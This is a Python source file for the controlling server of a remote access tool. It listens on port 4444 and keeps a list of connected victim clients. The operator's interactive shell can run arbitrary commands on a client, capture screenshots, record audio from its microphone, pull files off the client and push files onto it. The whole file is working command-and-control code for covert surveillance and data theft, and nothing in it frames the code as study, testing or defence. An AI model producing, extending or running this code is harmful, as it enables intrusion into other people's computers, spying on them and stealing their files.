import socket
import threading
import os
import sys
import time
import struct

class RemoteServer:
    def __init__(self, host='0.0.0.0', port=4444):
        self.host = host
        self.port = port
        self.server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self.clients = {}
        self.active_client = None
        self.active_client_dir = ""
        self.output_dir = "received_files"
        
        # Create output directory if it doesn't exist
        os.makedirs(self.output_dir, exist_ok=True)
        
    def start(self):
        self.server_socket.bind((self.host, self.port))
        self.server_socket.listen(5)
        print(f"[*] Server listening on {self.host}:{self.port}")
        
        while True:
            client_socket, client_address = self.server_socket.accept()
            print(f"[+] New connection from {client_address[0]}:{client_address[1]}")
            
            client_id = f"{client_address[0]}:{client_address[1]}"
            self.clients[client_id] = {
                'socket': client_socket,
                'address': client_address,
                'dir': ''
            }
            
            # Set as active client if it's the first one
            if self.active_client is None:
                self.active_client = client_id
                
            # Start client handler thread
            client_thread = threading.Thread(target=self.handle_client, args=(client_id,))
            client_thread.daemon = True
            client_thread.start()
            
    def handle_client(self, client_id):
        client = self.clients[client_id]
        client_socket = client['socket']
        file_transfer = None
        remaining_bytes = 0
        file_path = ""
        
        while True:
            try:
                # If we're in the middle of a file transfer
                if file_transfer:
                    data = client_socket.recv(min(4096, remaining_bytes))
                    if not data:
                        break
                    
                    # Write directly to server storage
                    file_transfer.write(data)
                    remaining_bytes -= len(data)
                    
                    if remaining_bytes <= 0:
                        file_transfer.close()
                        print(f"[+] File received and saved to server: {file_path}")
                        file_transfer = None
                else:
                    # Regular message handling
                    data = client_socket.recv(4096).decode('utf-8', errors='ignore')
                    if not data:
                        break
                    
                    # Handle special messages
                    if data.startswith("CONNECTED:"):
                        client['dir'] = data.split(":", 1)[1]
                        if client_id == self.active_client:
                            self.active_client_dir = client['dir']
                        print(f"[+] Client {client_id} connected. Current directory: {client['dir']}")
                    
                    elif data.startswith("DIR_CHANGED:"):
                        new_dir = data.split(":", 1)[1]
                        client['dir'] = new_dir
                        if client_id == self.active_client:
                            self.active_client_dir = new_dir
                            print(f"[+] Client directory updated to: {new_dir}")
                    
                    elif data.startswith("MONITOR:"):
                        print(f"[MONITOR] {data.split(':', 1)[1]}")
                    
                    elif data.startswith("FILE:"):
                        parts = data.split(":", 2)
                        if len(parts) == 3:
                            filename = parts[1]
                            file_size = int(parts[2])
                            
                            # Create directory structure in server storage
                            file_path = os.path.join(self.output_dir, filename)
                            os.makedirs(os.path.dirname(file_path), exist_ok=True)
                            
                            print(f"[+] Receiving file: {filename} ({file_size} bytes)")
                            
                            # Open file on server for writing
                            file_transfer = open(file_path, 'wb')
                            remaining_bytes = file_size
                            
                            # If there's additional data in this packet
                            additional_data_start = len(f"FILE:{filename}:{file_size}")
                            if len(data) > additional_data_start:
                                additional_data = data[additional_data_start:]
                                file_transfer.write(additional_data.encode('utf-8', errors='ignore'))
                                remaining_bytes -= len(additional_data)
                    
                    elif data == "COMMAND_COMPLETE\n":
                        # Command execution completed
                        pass
                    
                    else:
                        # Regular output
                        if client_id == self.active_client:
                            print(data.rstrip())
            
            except Exception as e:
                print(f"[-] Error with client {client_id}: {e}")
                break
        
        # Clean up disconnected client
        print(f"[-] Client {client_id} disconnected")
        if client_id in self.clients:
            del self.clients[client_id]
        if self.active_client == client_id:
            self.active_client = None
            self.active_client_dir = ""
        client_socket.close()
    
    def send_command(self, command):
        if self.active_client is None:
            print("[-] No active client")
            return
        
        try:
            client_socket = self.clients[self.active_client]['socket']
            client_socket.send(command.encode('utf-8'))
        except Exception as e:
            print(f"[-] Error sending command: {e}")
    
    def list_clients(self):
        print("\nConnected clients:")
        for i, client_id in enumerate(self.clients.keys()):
            status = "ACTIVE" if client_id == self.active_client else ""
            print(f"{i+1}. {client_id} - {self.clients[client_id]['dir']} {status}")
        print()
    
    def switch_client(self, client_index):
        client_ids = list(self.clients.keys())
        if 0 <= client_index < len(client_ids):
            self.active_client = client_ids[client_index]
            self.active_client_dir = self.clients[self.active_client]['dir']
            print(f"[+] Switched to client: {self.active_client}")
        else:
            print("[-] Invalid client index")
    
    def pull_file(self, remote_path):
        """Pull a file from the client to the server"""
        if not self.active_client:
            print("[-] No active client")
            return
        
        print(f"[*] Requesting file: {remote_path}")
        self.send_command(f"pull {remote_path}")
        
        # The file will be received through the normal file transfer mechanism
        # and saved in the output directory
    
    def send_file(self, local_path, remote_path=None):
        """Send a file from the server to the client"""
        if not self.active_client:
            print("[-] No active client")
            return
        
        if not os.path.exists(local_path):
            print(f"[-] File not found: {local_path}")
            return
        
        # If remote path not specified, use just the filename from local path
        # This will save the file in the current directory on the client
        if not remote_path:
            remote_path = os.path.basename(local_path)
        
        print(f"[*] Sending file: {local_path} -> {remote_path}")
        
        # Get file size
        file_size = os.path.getsize(local_path)
        
        # Send the send command with remote path and size
        self.send_command(f"send {remote_path} {file_size}")
        
        # Send the file content
        try:
            with open(local_path, 'rb') as f:
                client_socket = self.clients[self.active_client]['socket']
                bytes_sent = 0
                while bytes_sent < file_size:
                    chunk = f.read(4096)
                    if not chunk:
                        break
                    client_socket.send(chunk)
                    bytes_sent += len(chunk)
            
            print(f"[+] File sent successfully to client: {remote_path}")
        except Exception as e:
            print(f"[-] Error sending file: {e}")
    
    def interactive_shell(self):
        print("\n[*] Starting interactive shell...")
        print("[*] Type 'help' for available commands\n")
        
        while True:
            try:
                if self.active_client:
                    prompt = f"[{self.active_client_dir}]> "
                else:
                    prompt = "[no client]> "
                
                command = input(prompt).strip()
                
                if not command:
                    continue
                
                if command == "help":
                    print("\nAvailable commands:")
                    print("  list           - List connected clients")
                    print("  switch <num>   - Switch to client by number")
                    print("  screenshot     - Take screenshot from active client")
                    print("  record [sec]   - Record audio from active client")
                    print("  pull <path>    - Pull a file from client to server")
                    print("  send <lpath> [rpath] - Send a file from server to client")
                    print("  exit           - Exit the server\n")
                
                elif command == "list":
                    self.list_clients()
                
                elif command.startswith("switch "):
                    try:
                        client_index = int(command.split()[1]) - 1
                        self.switch_client(client_index)
                    except (IndexError, ValueError):
                        print("[-] Usage: switch <client number>")
                
                elif command == "screenshot":
                    self.send_command("screenshot")
                
                elif command.startswith("record "):
                    duration = command.split()[1] if len(command.split()) > 1 else "10"
                    self.send_command(f"record {duration}")
                
                elif command == "record":
                    self.send_command("record 10")
                
                elif command.startswith("pull "):
                    remote_path = command.split(' ', 1)[1]
                    self.pull_file(remote_path)
                
                elif command.startswith("send "):
                    parts = command.split(' ', 2)
                    if len(parts) >= 2:
                        local_path = parts[1]
                        remote_path = parts[2] if len(parts) > 2 else None
                        self.send_file(local_path, remote_path)
                    else:
                        print("[-] Usage: send <local_path> [remote_path]")
                
                elif command == "exit":
                    break
                
                else:
                    self.send_command(command)
            
            except KeyboardInterrupt:
                print("\n[*] Exiting...")
                break
            except Exception as e:
                print(f"[-] Error: {e}")

def main():
    server = RemoteServer()
    
    # Start server in a separate thread
    server_thread = threading.Thread(target=server.start)
    server_thread.daemon = True
    server_thread.start()
    
    # Wait for server to start
    time.sleep(1)
    
    # Start interactive shell
    server.interactive_shell()

if __name__ == "__main__":
    main()